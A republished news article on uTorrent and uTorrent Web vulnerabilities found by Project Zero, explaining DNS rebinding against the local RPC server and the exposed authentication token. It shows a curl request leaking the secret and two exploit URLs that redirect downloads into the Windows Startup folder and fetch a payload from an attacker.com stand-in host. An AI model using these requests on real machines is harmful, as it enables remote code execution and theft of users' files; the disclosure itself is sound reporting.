<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Vulnerability in uTorrent Web allows you to upload an arbitrary file in the startup folder: demo</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In two versions of uTorrent (under Windows and in the web version of uTorrent Web) several dangerous vulnerabilities have been discovered that are eas...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Vulnerability in uTorrent Web allows you to upload an arbitrary file in the startup folder: demo</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/webt/m8/mg/us/m8mgusx_5kwroidbiqp_6_4hkqe.png" align="left">  In two versions of uTorrent (under Windows and in the web version of uTorrent Web) several dangerous vulnerabilities have been discovered that are easy to exploit.  At the same time, they allow you to run arbitrary code on a machine running uTorrent (web version);  get access to downloaded files, including copy them, view download history (web version and Windows). <br><br>  Hacking is possible only if uTorrent works with default settings, namely with HTTP RPC server on port 10000 (uTorrent Classic) or 19575 (web version of uTorrent) with the activated handler <code>/proxy/</code> (it is activated by default). <br><br>  Bugs found the hacker Tavis Ormandy from Project Zero at Google.  He <a href="https://bugs.chromium.org/p/project-zero/issues/detail%3Fid%3D1524">disclosed information</a> in the Chromium bug tracker on January 31, 2018 (90 days after he informed the developers about it). <br><a name="habracut"></a><br>  As Tavis writes, any website can interact with the above RPC servers through the XMLHTTPRequest () programming interface.  This API uses HTTP or HTTPS requests directly to the server and loads server response data directly into the calling script.  The interface allows you to perform HTTP requests to the server without reloading the page and is often used on many modern sites. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      To hack the machine where uTorrent works, you need to lure the user to a web page where the exploit is installed.  It can be absolutely any site.  An exploit through <a href="https://ru.wikipedia.org/wiki/DNS_rebinding">DNS</a> reassignment via XMLHTTPRequest () forces the browser to run a script accessing this RPC server. <br><br>  The <a href="http://lock.cmpxchg8b.com/utorrent-crash-test.html">demo page</a> provides examples of what actions a web site can initiate via the JSON RPC server interface on port 10000. Here, standard uTorrent commands are sent via the XMLHTTPRequest () program interface. <br><br>  Tavis writes that while studying various commands of a uTorrent client, he noticed that the <code>/proxy/</code> handler is active in the program with default settings, which allows a third-party site to look at the list of downloaded files and copy them.  That is, by default, uTorrent allows any site to check the list of torrents you downloaded, you just need to clear one small number (sid), which is assigned to each open torrent in turn. <br><br>  Ormandy made a <a href="http://lock.cmpxchg8b.com/Ahg8Aesh.html">demo page</a> .  Hacker says the demo is slow, but if you still want to see the focus, do the following: <br><br><ol><li>  Install uTorrent with default settings. </li><li>  Add a torrent from the URL: <a href="https://archive.org/download/SKODAOCTAVIA336x280/SKODAOCTAVIA336x280_archive.torrent">https://archive.org/download/SKODAOCTAVIA336x280/SKODAOCTAVIA336x280_archive.torrent</a> . </li><li>  At the end of the torrent download (it is only 5 MB), go to the <a href="http://lock.cmpxchg8b.com/Ahg8Aesh.html">demo page</a> . </li><li>  Wait a few minutes. </li></ol>  ( <a href="">screenshot</a> ). <br><br>  In the course of studying the uTorrent program, Tavis found in it a couple more bugs and flaws: for example, an incorrect pseudo-random number generator, disabling ASLR memory protection and incorrect operation in the ‚Äúguest‚Äù mode, where many functions should be disabled, but in fact they are available through same server on port 10,000. <br><br>  In the web version, the vulnerability is even tougher, because there any third-party site can access the authentication token whose secret is stored in the open webroot folder (as well as settings, dumps, logs, etc.) - this surprised Tavis Ormandi very much. <br><br> <code><a href="" rel="nofollow">$ curl -si http://localhost:19575/users.conf</a> <br> HTTP/1.1 200 OK <br> Date: Wed, 31 Jan 2018 19:46:44 GMT <br> Last-Modified: Wed, 31 Jan 2018 19:37:50 GMT <br> Etag: "5a721b0e.92" <br> Content-Type: text/plain <br> Content-Length: 92 <br> Connection: close <br> Accept-Ranges: bytes <br> <br> localapi29c802274dc61fb4 <a href="https://crrev.com/bc676961df0f684b13adae450a57a91cd3d92c03" rel="nofollow">bc676961df0f684b13adae450a57a91cd3d92c03</a> 94bc897965398c8a07ff 2 1</code> <br> <br>  After receiving the secret, you can remotely change the directory for downloading and give the command to download an arbitrary file.  For example, upload the malicious code to the startup folder: <br><br> <code>http://127.0.0.1:19575/gui/?localauth=token:&amp;action=setsetting&amp;s=dir_active_download&amp;v=C:/Users/All%20Users/Start%20Menu/Programs/Startup <br> <br> http://127.0.0.1:19575/gui/?localauth=token:&amp;action=add-url&amp;url=http://attacker.com/calc.exe.torrent</code> <br> <br>  ‚Üí <a href="http://lock.cmpxchg8b.com/Moer0kae.html">Worker exploit</a> <br><br>  Developers from BitTorrent, Inc.  have already released a patch for uTorrent under Windows.  So far, it is only available in the <a href="http://www.utorrent.com/downloads/complete/track/beta/os/win">beta version of uTorrent / BitTorrent 3.5.3.44352</a> , which should soon be available through an automatic update mechanism.  Users of <a href="https://web.utorrent.com/">uTorrent Web</a> need to upgrade to the latest build 0.12.0.502. <br><br>  <i>uTorrent is one of the most popular torrent clients written in C ++.</i>  <i>It has a small size and high speed with a sufficiently large functionality.</i>  <i>The first version was released September 18, 2005.</i>  <i>Now available in versions for all major operating systems.</i>  <i>The number of users exceeds 100 million people.</i>  <i>In the first versions, the author tried to make money on contextual advertising, then the program was bought by BitTorrent, which was monetized through the imposition of toolbars, adware and Yandex Browser (in the Russian version).</i> </div><p>Source: <a href="https://habr.com/ru/post/371283/">https://habr.com/ru/post/371283/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../371271/index.html">Why is it still worth being afraid of killer robots?</a></li>
<li><a href="../371275/index.html">Electronic skin from Japanese researchers shows heartbeat</a></li>
<li><a href="../371277/index.html">Russian scientists are developing a pacemaker without batteries</a></li>
<li><a href="../371279/index.html">Unsinkable SoundCloud: from the idea to the 10th anniversary of the project - the most complete audiostart story</a></li>
<li><a href="../371281/index.html">Future Messenger</a></li>
<li><a href="../371285/index.html">In Venezuela, a number of enterprises are obliged to accept the national cryptocurrency "petro"</a></li>
<li><a href="../371287/index.html">Attention Management and Application</a></li>
<li><a href="../371289/index.html">Network culture and the sixth communicative revolution</a></li>
<li><a href="../371291/index.html">Summary of Steve Jobs from 1972 put up for auction</a></li>
<li><a href="../371293/index.html">A little bit of everything: car, cloud, Raspberry Pi and CAN</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>